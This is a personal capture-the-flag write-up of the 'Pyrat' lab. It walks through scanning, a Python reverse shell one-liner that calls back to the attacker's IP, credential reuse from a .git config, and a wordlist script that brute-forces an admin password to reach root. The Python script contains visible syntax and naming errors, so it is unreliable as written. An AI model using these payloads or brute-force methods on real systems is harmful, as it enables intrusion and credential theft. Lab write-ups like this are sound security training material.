- - - 
created : 21-07-2025 

Tags : #easy 
- - - 
# Objective

Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.
# Recon

## Rustscan - Nmap

First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ rustscan -a pyrat.thm -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.139.167:22
Open 10.10.139.167:8000

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 08:20:e6:af:d7:53:74:b8:11:9a:b7:61:df:e3:6d:98 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/L3dt8aXmU5JJJUGLXkWnjSCQA++u86Xejqy3terRtN4Yp0eC5Eebijc2ewt+IvDCOLaYiL0YMBcNNm3wgHswzNIzkp9Q5pwbFGNzYRPThHU3DCBiyitrsR4WQOJPRJ0pugDjIUnsHcx3EJtC7PMZjYFVGngVKn2AKdTG+cXHv7vgi8uofN+dNO6xo+wtkk+u6sF/aospqznU/4l4h4NklaZKYI+TDpc4uxPlPTm+51gNeg9u45Y56WOxzEV7Az8hrOlAoujCWVJr2ThDrclKJAGAkEX7VyFg3faWK+35WEWZh19saTkb06NkCFULGlWzFeIA95zyr1/vVCe8WitlYUpD/6A/Mfdveh9Yvqo9s8owVqeoRMeEfez2bex0yjTzq+x7T8klXclXDf4vzL9XFIp71Gqzv0xJp9KS6xHmQO0aq8lSkHCEekmsoQTZVItCo0S96SBQkuguB7Q6QDp6WIKsVs4GKM+0mkD8x7+6jYEBm5VtnF3PUORcCU33Z8U=
|   256 e5:28:5e:9c:1b:4f:f2:28:af:13:48:2e:26:13:14:08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN5fz/jTio9+zP8sScFSwwauwAIwc4a5ykUcaZnN7/vQIDLNX2X3t1GFIRsmqr+x11U+nIJNLdtDE9ecLbN8Lrk=
|   256 c2:ed:24:c8:70:93:e7:2c:ea:c3:ba:a5:d6:5b:11:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDNt0QRonyggMNnHAf0bRwLIkEUDfJi81ME+iezKteKX
8000/tcp open  http-alt syn-ack ttl 63 SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```
# Enumeration

## HTTP (8000)

We try to go there :

![Pasted image 20250721153607.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250721153607.png)

We can try [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash
──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ nc pyrat.thm 8000
clear
name 'clear' is not defined
please subscribe
invalid syntax (<string>, line 1)
```

We have a running [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) . 
# Exploit

## Reverse Shell

We go to [ReverseShellCheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python) and copy :

```
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.162.183",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

## Netcat 

We set up our listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ nc -lvnp 1337
listening on [any] 1337 ...

```

now we paste the [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) in the python server :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.139.167] 36388
$ whoami
whoami
www-data
```

And we have a shell .

## Shell Stabilization

We can now perform a [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```bash
$ export TERM=xterm
export TERM=xterm
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
www-data@ip-10-10-139-167:~$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
```
# Privilege Escalation

We can find some info about the shell endpoint :

```bash
www-data@ip-10-10-139-167:/opt/dev/.git$ cat COMMIT_EDITMSG 
Added shell endpoint
www-data@ip-10-10-139-167:/opt/dev/.git$ cat HEAD 
ref: refs/heads/master

www-data@ip-10-10-139-167:/opt/dev/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_

```

And a password . We have a [Github](../../3%20-%20Tags/Hacking%20Concepts/Github.md) account, let's try password reusing on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ ssh think@pyrat.thm      
The authenticity of host 'pyrat.thm (10.10.139.167)' can't be established.
ED25519 key fingerprint is SHA256:1zgaKWywJMFlKKf7DVoBKYnmmyuRk1tg6aA/HB64gfQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'pyrat.thm' (ED25519) to the list of known hosts.
think@pyrat.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 21 Jul 2025 02:00:21 PM UTC

  System load:  0.0               Processes:             117
  Usage of /:   46.6% of 9.75GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for ens5: 10.10.139.167
  Swap usage:   0%

  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

22 updates can be applied immediately.
13 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

You have mail.
Last login: Thu Jun 15 12:09:31 2023 from 192.168.204.1
think@ip-10-10-139-167:~$ 

```

BOOM !!

Now let's just cat the user flag :

```bash
think@ip-10-10-139-167:/home$ cd think
think@ip-10-10-139-167:~$ cat user.txt 
996bdb1f619a68361417cabca5454705
```

Now we re-go in the .git repo but we log :

```bash
think@ip-10-10-139-167:/opt/dev$ git log
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

think@ip-10-10-139-167:/opt/dev$ git show 0a3c36d66369fd4b07ddca72e5379461a63470bf

commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
(END)

```

It's taking data and checking if the user is admin, if we go on python (8000) and type `shell` :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ nc pyrat.thm 8000
shell
$ whoami
whoami
www-data
$ 
```

We have it but we are www-data, but if we modify the endpoint to the admin user, maybe we can have a root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) here. 
## Custom Scripting (Python)

We can create a custom script in [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) :
1. Send a request to pyrat.thm 8000 
2.  Loop through a list of possible parameters (wordlist)
3. Tell us if the parameter is correct

```python
import socket
import sys

# Setting up the target

host = 'pyrat.thm'
port = 8000

# Setting up the wordlist
wordlist_file = "/usr/share/wordlists/rockyou.txt"

# Set up the request to the endpoint
def fuzz.password(password_wordlist):
    try:
        # Open our wordlist file
        with open(password_wordlist. 'r') as file:
             for line in file:
                 # Clean up all the new lines and junk so I don't get mad
                 password = password.strip()
                 
                 # Establish connection on the server
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                      s.connect((host, port))
                      
                      # Send the "admin" command so we can prompt for password
                      s.sendall(b'admin\n')
                      
                      # Receive the password prompt
                      response = s.recv(1024).decode().strip() 
                      
                      if "password" in response.lower():
                          s.sendall((password + '\n').encode())
                      
                          # Response after entering the password
                          response = s.recv(1024).decode().strip() 

                          # Check if password is correct or if it's still asking for  password
                          if "password:" in response.lower():
                              continue 
                          else:
                              print(f"Congrats 1337 h4x0r the password is: {password}")
                              break
             else:
                 print("You suck no password prompt received")
    except FileNorFoundError:
        print("Lol use a real file n00b")
    except Exception as e:
        print(f"Error occurred {e}")
# Run it
fuzz_password(password_wordlist)


```

Let's run it:

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Pyrat]
└─$ python3 fuzzing.py

Congrats 1337 h4x0r the password is: abc123

```

BOOM !!!

Now we log in as root and cat the root flag :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ nc pyrat.thm 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
ba5ed03e9e74bb98054438480165e221
```

PWNED !! 
